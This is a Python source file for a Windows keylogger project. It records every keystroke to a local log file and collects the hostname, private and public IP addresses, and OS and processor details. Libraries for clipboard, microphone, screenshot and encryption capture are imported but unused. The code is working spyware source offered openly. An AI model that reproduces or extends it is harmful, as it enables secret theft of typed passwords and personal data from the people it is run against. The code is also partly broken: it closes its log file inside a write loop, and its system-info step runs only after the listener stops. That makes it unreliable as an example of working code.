# Libraries

# Libraries for collecting computer information.
import socket
import platform

# Library for system info & time.
import time
import os

# Library for registring keystrokes.
from pynput.keyboard import Key, Listener

# Library for clipboard.
import win32clipboard

# Library for mic capabilities.
from scipy.io.wavfile import write
import sounddevice as sd

# Library for Encryption.
from cryptography.fernet import Fernet

import getpass
from requests import get

# Library for importing screenshots.
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


# Log file 

keys_info = "key_log.txt"
system_info = "sys_info.txt"
file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
extend = "\\"

count = 0
keys = []

def on_press(key):
    global keys, count
    
    print(key)
    keys.append(key)
    count += 1
    
    if count>= 1:
        count = 0
        write_file(keys)
        keys = []
        
def  write_file(keys):
    with open(file_path + extend + keys_info, "a") as k:
        for key in keys:
            c = str(key).replace("'", "")
            if c.find ("space") > 0:
                k.write('\n')
                k.close()
            elif c.find("Key") == -1:
                k.write(c)
                k.close()
                
def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Getting system information
def get_system_info():
    with open(file_path + extend + "sys_info.txt", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception as e:
            f.write("Could not get public IP address: " + str(e))
        
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

get_system_info()

